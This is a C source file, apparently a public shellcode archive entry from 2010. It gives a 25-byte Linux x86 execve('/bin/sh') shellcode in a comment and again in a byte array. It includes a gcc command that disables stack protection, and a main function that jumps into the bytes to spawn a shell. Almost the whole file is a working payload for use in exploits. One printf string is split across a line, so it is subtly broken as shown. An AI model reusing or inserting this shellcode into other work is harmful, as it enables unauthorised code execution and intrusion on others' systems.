#include <stdio.h>
#include <string.h>

/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 25 bytes execve("/bin/sh") shellcode
Platform: Linux x86

execve("/bin/sh", 0, 0);
gcc -Wl,-z,execstack filename.c

shellcode:

\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

*/


int main(){
char shell[] =
"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}